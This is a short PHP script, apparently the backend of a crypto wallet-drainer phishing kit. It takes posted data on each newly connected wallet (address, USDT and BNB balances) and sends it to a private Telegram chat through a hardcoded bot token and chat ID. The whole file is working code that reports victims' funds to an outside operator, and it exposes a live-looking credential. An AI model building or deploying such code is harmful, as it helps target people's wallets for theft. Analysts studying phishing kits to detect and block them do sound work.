<?php
// Telegram Bot Settings
$botToken = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
$chatId = '8191508290';

// Get JSON input
$data = json_decode(file_get_contents('php://input'), true);

// Extract data
$type = $data['type'] ?? 'unknown';
$wallet = $data['wallet'] ?? 'Not Provided';
$usdt = $data['usdt'] ?? 0;
$bnb = $data['bnb'] ?? 0;

// Format message
$message = "🔔 *New Wallet Connected*\n"
         . "Type: `$type`\n"
         . "👛 Wallet: `$wallet`\n"
         . "💵 USDT: *$usdt*\n"
         . "🪙 BNB: *$bnb*";

// Telegram API URL
$url = "https://api.telegram.org/bot$botToken/sendMessage";

// Send message
file_get_contents($url . '?' . http_build_query([
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
]));
?>
